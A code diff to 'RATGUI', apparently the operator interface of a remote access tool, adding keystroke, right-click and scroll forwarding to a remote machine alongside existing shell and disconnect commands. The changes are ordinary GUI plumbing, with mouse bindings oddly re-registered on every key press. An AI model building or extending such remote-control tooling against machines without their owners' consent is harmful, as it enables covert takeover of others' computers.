@@ -111,15 +111,39 @@ class RATGUI(ctk.CTk):
         self.send_command("click")
 
     def key_press(self, event):
-        char = event.char
-        if char:
-            self.send_command(f"type {char}")
-        elif event.keysym == "Return":
-            self.send_command("type \n")
-        elif event.keysym == "space":
-            self.send_command("type  ")
-        elif event.keysym == "BackSpace":
-            self.send_command("type \b")
+        special_keys = {
+            "Return": "[enter]",
+            "return": "[enter]",
+            "KP_Enter": "[enter]",
+            "Enter": "[enter]",
+            "enter": "[enter]",
+            "Tab": "\t",
+            "space": " ",
+            "BackSpace": "\b",
+            "Escape": "[esc]",
+            "Delete": "[delete]",
+            "Caps_Lock": "[capslock]",
+            "Control_L": "[ctrl]",
+            "Control_R": "[ctrl]",
+            "Alt_L": "[alt]",
+            "Alt_R": "[alt]",
+            "Shift_L": "[shift]",
+            "Shift_R": "[shift]",
+            "Left": "[left]",
+            "Right": "[right]",
+            "Up": "[up]",
+            "Down": "[down]"
+        }
+
+        if event.char:
+            self.send_command(f"type {event.char}")
+        elif event.keysym in special_keys:
+            self.send_command(f"type_special {special_keys[event.keysym]}")
+        else:
+            self.log(f"[!] Touche inconnue : {event.keysym}")
+        self.image_label.bind("<Button-3>", self.right_click)
+        self.image_label.bind("<MouseWheel>", self.scroll_mouse)
+
 
     def send_shell(self):
         self.send_command("shell")
@@ -164,6 +188,12 @@ class RATGUI(ctk.CTk):
 
     def type_text(self):
         self.send_command("type Bonjour depuis le serveur !")
+
+    def right_click(self, event):
+        self.send_command("right_click")
+
+    def scroll_mouse(self, event):
+        self.send_command(f"scroll {event.delta}")
 
     def send_disconnect(self):
         self.send_command("exit")
